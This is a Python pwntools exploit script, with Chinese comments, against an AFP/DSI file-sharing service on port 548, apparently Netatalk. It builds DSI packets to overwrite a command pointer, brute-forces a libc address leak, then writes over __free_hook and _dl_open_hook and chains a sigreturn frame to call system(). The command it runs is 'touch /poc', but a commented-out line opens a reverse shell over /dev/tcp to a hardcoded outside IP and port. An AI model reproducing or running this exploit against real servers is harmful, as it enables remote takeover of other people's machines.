from pwn import *

context(arch='amd64', os='linux', log_level='error')
FLAG_VAL = 0xdeadbeef
R_IP = b'47.240.70.54'
R_PORT = 8000
# CMD = b'ash -c "ash  -i>& /dev/tcp/%s/%d 0<&1" \x00' % (R_IP, R_PORT)
CMD = b'ash -c "touch /poc" \x00'
IP = '192.168.56.116'
PORT = 548
libc_bin = ELF('./libc-2.27.so')

# 创建DSI头部
def createDSIHeader(command, payload):
    dsi_header = b'\x00'  # dsi_flags, DSIFL_REQUEST
    dsi_header += command  # dsi_command
    dsi_header += b'\x01\x00'  # dsi_requestID
    dsi_header += p32(0)  # dsi_data
    dsi_header += struct.pack(">I", len(payload))  # dsi_len
    dsi_header += p32(0)  # dsi_reserved
    return dsi_header

# 替换命令指针
def replaceCommandPtr(io, addr):
    cmd_payload = p32(0)  # attn_quantum
    cmd_payload += p32(0)  # datasize
    cmd_payload += p32(FLAG_VAL)  # server_quantum
    cmd_payload += p32(0)  # serverID & clientID
    cmd_payload += addr  # **************** commands ptr ****************
    cmd_header = b'\x01'  # DSIOPT_ATTNQUANT
    cmd_header += p8(len(cmd_payload))
    dsifunc_open = b'\x04'  # DSIFUNC_OPEN
    dsi_header = createDSIHeader(dsifunc_open, cmd_header + cmd_payload)
    msg = dsi_header + cmd_header + cmd_payload
    io.send(msg)
    try:
        reply = io.recv()
        return reply
    except:
        return None

# 暴力破解
def bruteforce():
    leak_addr = b''
    flag_str = struct.pack('>I', FLAG_VAL)
    while len(leak_addr) < 6:
        # 对每个字节从255到0进行循环，获取一个位于libc_base以下的地址
        for i in range(255, -1, -1):
            io = remote(IP, PORT)
            cur_byte = p8(i)
            addr = leak_addr + cur_byte
            reply = replaceCommandPtr(io, addr)
            if reply is None:
                io.close()
                continue
            if flag_str in reply:
                io.close()
                print('Find! {}'.format(hex(i)))
                leak_addr += cur_byte
                break
    mmap_addr = u64(leak_addr.ljust(8, b'\x00'))   # 0x7fxxxxxfff, add 1
    return mmap_addr+1

# 任意地址写
def aaw(io, payload):
    dsifunc_cmd = b'\x04'           # DSIFUNC_OPEN
    dsi_payload = b'\x00'
    dsi_payload += payload
    dsi_header = createDSIHeader(dsifunc_cmd, dsi_payload)
    msg = dsi_header + dsi_payload
    io.send(msg)

# 执行漏洞利用
def do_exploit(cmd):
    libc_base = 0x7f3c7cb47000
    print('libc_base: {}'.format(hex(libc_base)))
    free_hook = libc_base + libc_bin.sym['__free_hook']
    dl_open_hook = libc_base + libc_bin.sym['_dl_open_hook2']
    print(hex(dl_open_hook))
    system_addr = libc_base + libc_bin.sym['system']
    setcontext_53 = libc_base + 0x43d85
    '''
    # 将_dl_open_hook的值放入rax，然后调用[rax]。调用**_dl_open_hook
    mov     rax, cs:_dl_open_hook
    call    qword ptr [rax]
    '''
    libc_dlopen_mode_56 = libc_base + 0x128027
    '''
    # 控制rdi进行SROP
    mov     rdi, rax
    call    qword ptr [rax+20h]
    '''
    fgetpos64_207 = libc_base + 0x6ad7f
    print(hex(fgetpos64_207))

    io = remote(IP, PORT)
    replaceCommandPtr(io, p64(free_hook - 0x10))        # 0x10: 1 byte func idx, 0xF bytes padding

    sigframe = SigreturnFrame()
    sigframe.rip = system_addr
    sigframe.rdi = free_hook + 8                   # cmd
    sigframe.rsp = free_hook                       # must be a writable address, as the stack of system func

    payload = b''.ljust(0xF, b'\x00')              # padding
    payload += p64(libc_dlopen_mode_56)
    payload += cmd.ljust(0x2c97, b'\x00')          # __free_hook + 8
    payload += p64(dl_open_hook + 15)           # dl_open_hook, *dl_open_hook = dl_open_hook+8, **dl_open_hook = fgetpos64+207
    payload += p64(fgetpos64_207)                # _dl_open_hook+8, let rdi = rax = _dl_open_hook + 8
    payload += b'A' * 0x18
    payload += p64(setcontext_53)             # dl_open_hook + 0x28 = rax + 0x20, call [rax+0x20] = setcontext+53
    payload += bytes(sigframe)[0x28:]           # 现在rdi = dl_open_hook + 8, 我们需要减少rdi到这个位置的偏移

    aaw(io, payload)
    io.close()                  # 触发free()

do_exploit(CMD)